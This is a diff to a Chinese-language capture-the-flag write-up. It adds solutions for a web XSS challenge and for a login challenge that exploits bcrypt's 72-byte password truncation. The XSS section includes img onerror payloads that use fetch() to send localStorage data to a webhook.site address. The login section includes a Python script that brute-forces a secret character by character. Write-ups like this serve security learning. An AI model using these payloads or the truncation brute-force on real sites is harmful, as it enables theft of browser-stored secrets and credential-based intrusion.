@@ -1,4 +1,6 @@
+
 # Jail
+
 ### sansomega
 ```python
 #!/usr/local/bin/python3
@@ -54,6 +56,25 @@ BANNED = ['import', 'class', 'Main', '{', '}']
 
 
 # web
+### sculpture
+#xss 
+前端js会执行base64解码后code传的参数
+```
+print "<img src='' onerror=alert(1)>"
+```
+可以弹窗
+
+```python
+print "<img src='' onerror=fetch('https://webhook.site/9af81269-162e-4884-bdc3-cdc3f301f608/'+localStorage.getItem('flag')) }>"
+```
+
+
+```python
+<img src='x' onerror=fetch('https://webhook.site/9af81269-162e-4884-bdc3-cdc3f301f608',{method:'POST',mode:'no-cors',body:localStorage.getItem('flag')});>
+```
+
+
+
 ### one-shot
 流程,new_session生成一个表(随机密码),search来匹配这个表里的字符且只能search一次,guess需要输入密码
 ```python
@@ -103,7 +124,51 @@ search的query参数存在sql注入
 `            if (tUsername.contains(flag)) return "No flag >:( !";`
 ,只剩下randomNum可以
 ~~分析登录接口可知,用户名是否存在都返回Credentials wrong,但是状态码未修改,我们可以据此来获取randomNum的值~~
-瞎扯,直接注册71用户不就行了,没办法判断
+
+---
+利用的是bcrypto加密的最大密码长度为72,
+```bash
+hashpw('testtdsdddddddddddddddddddddddddddddddddddddddddddddddsddddddddddddddddd', salt)
+Output: '$2a$15$jQYbLa5m0PIo7eZ6MGCzr.BC17WEAHyTHiwv8oLvyYcg3guP5Zc1y'
+
+hashpw('testtdsdddddddddddddddddddddddddddddddddddddddddddddddsdddddddddddddddddd', salt)
+Output: '$2a$15$jQYbLa5m0PIo7eZ6MGCzr.BC17WEAHyTHiwv8oLvyYcg3guP5Zc1y'
+```
+
+所以我们可以通过'A'\*n+flag{},注册账号,通过登录来遍历字母,然后逐步减少'a',增加flag的位数
+
+```python
+import requests
+import os
+import string
+
+HOST = "http://creative-login-page.amt.rs"
+CHARSET = "}_" + string.ascii_letters + string.digits
+FLAG = "amateursCTF{"
+# FLAG = "a"
+
+def register(username, password):
+    return requests.post(f"{HOST}/register", data={'username': username, 'password': password})
+
+def login(username, password):
+    return requests.post(f"{HOST}/login",data={'username': username, 'password': password})
+
+while FLAG[-1] != "}":
+    found = False
+    uname = os.urandom(16).hex()
+    passwd = "A" * (72 - len(FLAG) - 1)
+    register(uname, passwd + "{{flag}}")
+    for c in CHARSET:
+        r = login(uname, passwd + FLAG + c)
+        if r.status_code == 200:
+            found = True
+            FLAG = FLAG + c
+            print(FLAG)
+            break
+    if found == False: break
+```
+
+
 
 
 # reverse
